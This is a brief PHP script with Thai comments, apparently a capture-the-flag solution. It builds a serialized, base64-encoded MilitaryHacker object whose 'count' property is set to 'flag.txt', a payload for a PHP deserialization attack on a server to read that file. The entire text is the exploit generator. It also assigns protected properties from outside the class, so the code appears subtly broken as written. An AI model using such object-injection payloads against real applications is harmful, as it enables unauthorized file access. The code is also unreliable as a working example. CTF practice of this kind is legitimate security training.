<?php
// สเตับคลาสให้ตรงกับเซิร์ฟเวอร์
class MilitaryHacker {
    protected $tmp;
    protected $count;
    protected $len;

    // constructor แค่รับค่า tmp
    public function __construct($tmp) {
        $this->tmp = $tmp;
    }
}

// สร้าง object แล้วม็อด property ตามต้องการ
$obj = new MilitaryHacker("DUMMY");   // tmp ใส่ DUMMY หรืออะไรก็ได้
$obj->count = "flag.txt";             // ตัวนี้สำคัญต้องเป็น flag.txt
$obj->len   = 0;                      // ค่า dummy

// serialize → base64 encode → พิมพ์ออกหน้าจอ
$serialized = serialize($obj);
$b64        = base64_encode($serialized);
echo $b64;
